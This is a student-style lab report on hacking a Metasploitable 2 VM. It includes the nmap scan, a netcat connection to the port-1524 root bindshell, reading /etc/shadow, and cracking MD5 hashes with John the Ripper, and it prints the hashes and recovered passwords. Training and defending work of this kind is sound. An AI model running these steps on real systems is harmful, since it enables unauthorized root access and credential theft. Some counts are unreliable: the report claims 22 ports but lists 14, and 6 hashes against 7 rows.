# Lab Report 02 — System Hacking & Password Cracking
**Author:** Frank Arhin  
**GitHub:** Frank-CyberSec  
**Date:** 02 May 2026  
**Classification:** Personal Lab — Educational Purposes Only  

---

## 1. Executive Summary

This report documents the findings of a penetration testing lab exercise conducted in a controlled virtual environment. The objective was to perform system hacking and password cracking against a Metasploitable 2 target machine using Kali Linux 2026.1 as the attacking platform. The exercise covers CEH v13 Domains 5, 6, and 7.

---

## 2. Lab Environment

| Component | Details |
|---|---|
| **Attacker Machine** | Kali Linux 2026.1 |
| **Target Machine** | Metasploitable 2 (Linux 2.6.24) |
| **Hypervisor** | Oracle VirtualBox |
| **Network Type** | Bridged Adapter |
| **Attacker IP** | 192.168.1.165 |
| **Target IP** | 192.168.1.214 |

---

## 3. Methodology

The following phases were conducted in accordance with the CEH v13 penetration testing methodology:

1. Network Scanning & Service Discovery
2. Vulnerability Identification
3. Exploitation — Backdoor Access
4. Post Exploitation — Password Hash Extraction
5. Password Cracking

---

## 4. Tools Used

| Tool | Purpose | CEH Domain |
|---|---|---|
| **Nmap 7.99** | Network scanning and service discovery | Domain 3 |
| **Netcat (nc)** | Backdoor shell access via port 1524 | Domain 6 |
| **John the Ripper** | Password hash cracking | Domain 6 |
| **rockyou.txt** | Password wordlist for dictionary attack | Domain 6 |

---

## 5. Findings

### 5.1 Network Scan Results

**Command Used:**
```bash
nmap -A -T4 192.168.1.214
```

**Open Ports Discovered:**

| Port | Service | Version | Risk |
|---|---|---|---|
| 21/tcp | FTP | vsftpd 2.3.4 | 🔴 Critical |
| 22/tcp | SSH | OpenSSH 4.7p1 | 🟡 Medium |
| 23/tcp | Telnet | Linux telnetd | 🔴 Critical |
| 25/tcp | SMTP | Postfix | 🟡 Medium |
| 53/tcp | DNS | ISC BIND 9.4.2 | 🟡 Medium |
| 80/tcp | HTTP | Apache 2.2.8 | 🔴 Critical |
| 139/tcp | NetBIOS | Samba 3.0.20 | 🔴 Critical |
| 445/tcp | SMB | Samba 3.0.20 | 🔴 Critical |
| 1524/tcp | Bindshell | Root backdoor shell | 🔴 Critical |
| 3306/tcp | MySQL | 5.0.51a | 🔴 Critical |
| 5432/tcp | PostgreSQL | 8.3.0 - 8.3.7 | 🔴 Critical |
| 5900/tcp | VNC | Protocol 3.3 | 🔴 Critical |
| 6667/tcp | IRC | UnrealIRCd 3.2.8.1 | 🔴 Critical |
| 8180/tcp | HTTP | Apache Tomcat 5.5 | 🔴 Critical |

**Total open ports discovered: 22**

---

### 5.2 Backdoor Shell Access — Port 1524

**Command Used:**
```bash
nc 192.168.1.214 1524
```

**Result:**

A root backdoor shell was discovered running on port 1524. Connecting via Netcat provided immediate root level access to the target machine without any authentication required.

| Finding | Detail |
|---|---|
| **Access Level** | Root (highest privilege) |
| **Authentication Required** | None |
| **Port** | 1524/tcp |
| **Service** | Bindshell |

---

### 5.3 System Information Gathered

After gaining root access, the following system information was extracted:

| Finding | Detail |
|---|---|
| **Operating System** | Linux 2.6.24-16-server |
| **Hostname** | metasploitable |
| **Architecture** | i686 GNU/Linux |
| **Build Date** | April 10 2008 |
| **IP Address** | 192.168.1.214 |
| **MAC Address** | 08:00:27:cd:7c:da |

---

### 5.4 User Accounts Discovered

The following user accounts were extracted from /etc/passwd:

| Username | User ID | Role |
|---|---|---|
| root | 0 | Superuser |
| msfadmin | 1000 | Main administrator |
| user | 1001 | Regular user |
| service | 1002 | Service account |
| postgres | 108 | Database administrator |
| mysql | 109 | MySQL database account |
| tomcat55 | 110 | Apache Tomcat account |

---

### 5.5 Password Hash Extraction

**Command Used:**
```bash
cat /etc/shadow
```

**Password Hashes Extracted:**

| Username | Hash Type | Hash |
|---|---|---|
| root | MD5 ($1$) | $1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid. |
| sys | MD5 ($1$) | $1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0 |
| klog | MD5 ($1$) | $1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0 |
| msfadmin | MD5 ($1$) | $1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/ |
| postgres | MD5 ($1$) | $1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/ |
| user | MD5 ($1$) | $1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0 |
| service | MD5 ($1$) | $1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu// |

**Total hashes extracted: 6**

---

### 5.6 Password Cracking Results

**Command Used:**
```bash
john --format=md5crypt cleanhashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Cracked Passwords:**

| Username | Password | Time to Crack | Strength |
|---|---|---|---|
| **msfadmin** | msfadmin | < 1 second | 🔴 Terrible |
| **klog** | 123456789 | < 3 minutes | 🔴 Terrible |
| **sys** | batman | < 3 minutes | 🔴 Very Weak |
| **service** | service | < 3 minutes | 🔴 Terrible |

**Results Summary:**
- Total hashes: 6
- Cracked: 4 (66%)
- Remaining: 2 (stronger passwords)

---

## 6. Risk Assessment

| Finding | Risk Level | Reason |
|---|---|---|
| Root backdoor on port 1524 | 🔴 Critical | Instant root access with no authentication |
| Weak passwords | 🔴 Critical | 4 out of 6 passwords cracked in minutes |
| MD5 password hashing | 🔴 Critical | MD5 is outdated and easily cracked |
| 22 open ports | 🔴 High | Large attack surface |
| Telnet running | 🔴 High | Unencrypted protocol |
| Anonymous FTP allowed | 🔴 High | Allows unauthorised file access |
| Outdated OS (2008) | 🔴 Critical | No security patches for 18 years |
| Username as password | 🔴 Critical | msfadmin and service used their own username |

---

## 7. Recommendations

1. **Remove the backdoor shell** — Port 1524 bindshell must be immediately removed
2. **Enforce strong password policy** — Minimum 12 characters with complexity requirements
3. **Replace MD5 hashing** — Use bcrypt or SHA-512 for password storage
4. **Disable Telnet** — Replace with SSH for encrypted communication
5. **Disable anonymous FTP** — Require authentication for all FTP access
6. **Close unnecessary ports** — Only open ports that are required
7. **Update the operating system** — Apply all available security patches
8. **Implement account lockout** — Lock accounts after failed login attempts
9. **Never use username as password** — Enforce password complexity rules
10. **Regular security audits** — Conduct periodic penetration tests

---

## 8. CEH v13 Domains Covered

| Domain | Topic | Demonstrated |
|---|---|---|
| Domain 3 | Scanning Networks | ✅ Nmap scan of 22 ports |
| Domain 5 | Vulnerability Analysis | ✅ Identified critical vulnerabilities |
| Domain 6 | System Hacking | ✅ Root access via backdoor |
| Domain 6 | Password Cracking | ✅ Cracked 4 of 6 passwords |

---

## 9. Conclusion

The penetration test of Metasploitable 2 revealed numerous critical vulnerabilities. A root backdoor shell was discovered on port 1524 which allowed immediate unauthenticated root access to the system. Password hashes were successfully extracted from /etc/shadow and 4 out of 6 passwords were cracked using a dictionary attack with John the Ripper and the rockyou.txt wordlist. The results highlight the critical importance of strong password policies, regular patching, and minimising the attack surface by closing unnecessary ports and services.

---

## 10. References

- EC-Council CEH v13 Official Courseware
- Nmap Documentation: https://nmap.org/docs.html
- John the Ripper Documentation: https://www.openwall.com/john/
- Metasploitable 2 Documentation: https://docs.rapid7.com/metasploit/metasploitable-2/
- CVE Database: https://cve.mitre.org

---

*This report was produced in a controlled lab environment for educational purposes only. All testing was conducted on machines owned and operated by the author.*
